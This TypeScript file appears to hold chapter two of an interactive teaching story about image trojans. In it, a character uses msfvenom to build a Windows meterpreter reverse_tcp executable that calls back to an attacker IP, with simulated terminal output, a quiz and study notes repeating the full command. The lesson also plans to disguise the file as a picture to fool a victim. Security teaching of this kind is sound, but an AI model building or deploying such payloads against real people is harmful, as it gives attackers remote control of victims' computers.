import type { Chapter, QuizQuestion, Scene } from "../../story";

const scenes: Scene[] = [
  [
    { from: "system", text: "cyber-attacks · image trojan · chapter 02" },
    { from: "system", text: "🛠️ forge room. kim's terminal only — for now." },
  ],
  [
    { from: "kim", text: "tool: {green:msfvenom}. comes with metasploit. builds custom payloads. disguises them as 'harmless' files." },
    { from: "kim", text: "first check it's installed." },
    {
      from: "system",
      dual: {
        kim: {
          title: "msfvenom",
          prompt: "kim@kali:~$",
          command: "msfvenom -h | head",
          output: `MsfVenom - a Metasploit standalone payload generator.
Usage: msfvenom -p <payload> [options]

{cyan:-p}  payload   e.g. windows/meterpreter/reverse_tcp
{yellow:LHOST} attacker IP (where victim connects back)
{yellow:LPORT} listening port (often {pink:4444})
{cyan:-f}  format    exe for windows
{cyan:-o}  output    file path/name`,
        },
        sally: {
          mode: "idle",
          title: "still browsing memes",
          note: "sally: 😂 unrelated cat videos",
        },
      },
    },
  ],
  [
    { from: "kim", text: "list payloads. i want {pink:reverse_tcp} — windows meterpreter." },
    {
      from: "kim",
      terminal: {
        title: "payload menu",
        prompt: "kim@kali:~$",
        command: "msfvenom -l payloads | rg reverse_tcp | head",
        output: `windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_https
windows/shell/reverse_tcp
… lots more

{green:picked → windows/meterpreter/reverse_tcp}`,
      },
    },
    { from: "kim", text: "once she opens the file, her pc connects back to me over tcp. remote meterpreter session. 🎣" },
  ],
  [
    { from: "kim", text: "generate time. LHOST = my ip. LPORT = 4444. format = exe. name = picture.exe" },
    {
      from: "system",
      dual: {
        kim: {
          title: "forge",
          prompt: "kim@kali:~$",
          command:
            "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f exe -o picture.exe",
          output: `[-] No platform was selected, choosing Msf::Module::Platform::Windows
No Arch selected, selecting Arch: x86
No encoder specified, outputting raw payload
Payload size: {yellow:354} bytes
Final size of exe file: {yellow:73802} bytes
Saved as: {pink:picture.exe} ✅`,
        },
        sally: {
          mode: "idle",
          note: "sally still safe… for a few chapters",
        },
      },
    },
    { from: "kim", text: "73 kb. looks ordinary in my home folder. inside: reverse shell waiting to wake up." },
  ],
  [
    { from: "sally", text: "why would anyone double-click a file named picture.exe though? 🤨" },
    { from: "kim", text: "they wouldn't. so next i give it a costume. 🎭" },
    {
      from: "system",
      callout: {
        tone: "warning",
        title: "to be continued",
        text: "picture.exe is honest. too honest. kim will rename it to look like a jpeg — and windows will help him lie.",
      },
    },
    { from: "system", text: "chapter 2 complete." },
  ],
];

const quiz: QuizQuestion[] = [
  {
    question: "msfvenom is used to…",
    options: ["edit photos", "generate malicious payloads", "brew coffee", "draw diagrams"],
    answer: 1,
    explanation: "Payload generator in the Metasploit toolkit.",
  },
  {
    question: "which flag selects the payload?",
    options: ["-f", "-p", "-o", "-lhost"],
    answer: 1,
    explanation: "-p payload",
  },
  {
    question: "LHOST is…",
    options: ["sally's password", "the attacker IP the victim connects back to", "a jpeg filter", "port 80 only"],
    answer: 1,
    explanation: "Local host from the payload's view = attacker callback IP.",
  },
  {
    question: "LPORT 4444 is…",
    options: ["a default listening port for many reverse payloads", "sally's birthday", "https", "unused always"],
    answer: 0,
    explanation: "Common Metasploit listener port — must be free.",
  },
  {
    question: "kim's output format for windows was…",
    options: ["pdf", "exe", "mp3", "svg"],
    answer: 1,
    explanation: "-f exe",
  },
  {
    question: "windows/meterpreter/reverse_tcp creates…",
    options: ["a screensaver", "a reverse shell / meterpreter session back to kim", "a vpn", "a password manager"],
    answer: 1,
    explanation: "Victim connects out; attacker gets control channel.",
  },
];

const notes = `
> offtrck · image trojan · study notes
> chapter 02 · msfvenom forge

## msfvenom
command-line payload generator (Metasploit).

## useful flags
| flag | meaning |
|---|---|
| \`-p\` | payload |
| \`LHOST\` | attacker callback IP |
| \`LPORT\` | listener port |
| \`-f\` | format (\`exe\` for windows) |
| \`-o\` | output filename |

## payload used
\`windows/meterpreter/reverse_tcp\`
→ reverse shell / meterpreter session

## example
\`\`\`
msfvenom -p windows/meterpreter/reverse_tcp \\
  LHOST=<attacker-ip> LPORT=4444 -f exe -o picture.exe
\`\`\`

## what's next
rename so it looks like a jpeg.
`;

export const trojanChapterTwo: Chapter = {
  title: "chapter 02",
  subtitle: "msfvenom forge",
  scenes,
  quiz,
  notes,
};
